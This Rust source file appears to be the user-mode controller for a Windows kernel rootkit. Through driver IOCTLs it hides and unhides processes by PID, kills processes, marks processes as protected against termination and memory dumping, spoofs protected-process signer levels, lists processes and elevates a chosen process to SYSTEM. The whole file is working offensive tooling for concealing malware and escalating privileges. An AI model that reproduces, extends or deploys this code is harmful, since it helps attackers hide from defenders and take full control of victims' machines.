use {
    crate::{
        cli::{Options, PS_PROTECTED_SIGNER, PS_PROTECTED_TYPE}, 
        driver::open_driver
    }, 
    shared::{
        structs::{
            EnumerateInfoInput, ProcessListInfo, TargetProcess, 
            ProcessInfoHide, ProcessSignature,
        },
        vars::MAX_PIDS
    }, 
    std::{ffi::c_void, mem::size_of, ptr::null_mut}, 
    windows_sys::Win32::{Foundation::CloseHandle, System::IO::DeviceIoControl}
};

pub fn hide_unhide_process(pid: Option<&u32>, ioctl_code: u32, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    
    if let Some(pid_value) = pid {
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process = ProcessInfoHide::default();
        target_process.enable = if enable {
            true
        } else {
            false
        };

        target_process.pid = pid;
        
        status = unsafe { 
                DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process  as *mut _ as *mut c_void,
                std::mem::size_of::<ProcessInfoHide>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut()
            )
        };

        if status == 0 {
            eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            if enable {
                println!("[+] Process with PID {pid} successfully hidden");
            } else {
                println!("[+] Process with PID {pid} successfully unhidden");
            }
    
        }
    } else {
        println!("[-] PID not supplied");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn terminate_process(pid: Option<&u32>, ioctl_code: u32) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    
    if let Some(pid_value) = pid {
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process = TargetProcess {
            pid,
        };
        
        status = unsafe { 
                DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process  as *mut _ as *mut c_void,
                std::mem::size_of::<TargetProcess>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut()
            )
        };

        if status == 0 {
            eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            println!("[+] Process with PID {pid} terminated successfully");
        }
    } else {
        println!("[-] PID not supplied");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

#[cfg(not(feature = "mapper"))]
pub fn protection_process(pid: Option<&u32>, ioctl_code: u32, enable: bool) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    
    if let Some(pid_value) = pid {
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process =  shared::structs::ProcessProtection {
            pid,
            enable
        };
        
        status = unsafe { 
                DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process  as *mut _ as *mut c_void,
                std::mem::size_of::<shared::structs::ProcessProtection>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut()
            )
        };

        if status == 0 {
            eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            println!("[+] Process PID {pid} with anti-kill and dumping functions enabled");
        }
    } else {
        println!("[-] PID not supplied");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn enumerate_process(ioctl_code: u32, option: &Options) {
    let h_file = open_driver().expect("Failed to open driver");
    let mut info_process: [ProcessListInfo; MAX_PIDS] = unsafe { std::mem::zeroed() };
    let mut enumeration_input = EnumerateInfoInput {
        options: option.to_shared()
    };
    let mut return_buffer = 0;
    let status = unsafe { 
            DeviceIoControl(
            h_file,
            ioctl_code,
            &mut enumeration_input  as *mut _ as *mut c_void,
            size_of::<EnumerateInfoInput>() as u32,
            info_process.as_mut_ptr() as *mut _,
            (info_process.len() * size_of::<ProcessListInfo>()) as u32,
            &mut return_buffer,
            null_mut()
        )
    };

    if status == 0 {
        eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
    } else {
        let total_process = return_buffer as usize / size_of::<ProcessListInfo>();
        println!("[+] Total Processes: {}", total_process);
        for i in 0..total_process {
            if info_process[i].pids > 0 {
                println!("[{}] {}", i, info_process[i].pids);
            }
        }
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn signature_process(pid: Option<&u32>, ioctl_code: u32, sg: &PS_PROTECTED_SIGNER, tp: &PS_PROTECTED_TYPE) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    
    if let Some(pid_value) = pid {
        let mut return_buffer = 0;
        let sg = *sg as usize;
        let tp = *tp as usize;
        let pid = *pid_value as usize;
        let mut info_protection_process = ProcessSignature {
            pid,
            sg,
            tp,
        };    

        status = unsafe { 
                DeviceIoControl(
                h_file,
                ioctl_code,
                &mut info_protection_process  as *mut _ as *mut c_void,
                std::mem::size_of::<ProcessSignature>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut()
            )
        };

        if status == 0 {
            eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            println!("[+] Process with PID {pid} successfully protected");
        }
    }

    unsafe { 
        CloseHandle(h_file);
    };
}

pub fn elevate_process(pid: Option<&u32>, ioctl_code: u32) {
    let h_file = open_driver().expect("Failed to open driver");
    let status;
    
    if let Some(pid_value) = pid {
        let mut return_buffer = 0;
        let pid = *pid_value as usize;
        let mut target_process = TargetProcess {
            pid,
        };
        
        status = unsafe { 
                DeviceIoControl(
                h_file,
                ioctl_code,
                &mut target_process as *mut _ as *mut c_void,
                std::mem::size_of::<TargetProcess>() as u32,
                null_mut(),
                0,
                &mut return_buffer,
                null_mut()
            )
        };

        if status == 0 {
            eprintln!("[!] DeviceIoControl Failed with status: 0x{:08X}", status);
        } else {
            println!("[+] Process with PID {pid} elevated to System")
        }
    } else {
        println!("[-] PID not supplied");
    }

    unsafe { 
        CloseHandle(h_file);
    };
}
